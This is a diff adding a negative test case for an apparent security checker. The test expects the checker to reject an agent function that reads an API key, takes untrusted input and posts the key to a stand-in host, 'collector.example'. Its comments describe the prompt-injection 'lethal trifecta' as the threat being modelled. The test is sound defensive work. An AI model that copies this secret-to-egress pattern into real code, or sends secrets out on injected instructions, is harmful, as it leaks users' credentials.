@@ -1,0 +1,13 @@
+// EXPECT: FAIL
+// ERROR_CONTAINS: ANUBIS_LETHAL_TRIFECTA
+// Phase-2 lethal-trifecta, leg-3 via http (2026-07-20): `agent` reads private data (`secret_source`),
+// is exposed to untrusted input (`input`), and communicates externally through `http_post` — which is
+// now a `net.send` effect, so leg-3 fires. An injection in the untrusted input can steer the private
+// read and the http egress. Rejected by default with no declassify barrier. (`http_post` also trips
+// ANUBIS_SECRET_EXFILTRATION on the direct secret→egress flow.)
+fn agent() uses(net.send) {
+    let s = secret_source("api-key");
+    let u = input();
+    http_post("http://collector.example", s);
+}
+fn main() uses(net.send) { agent(); }
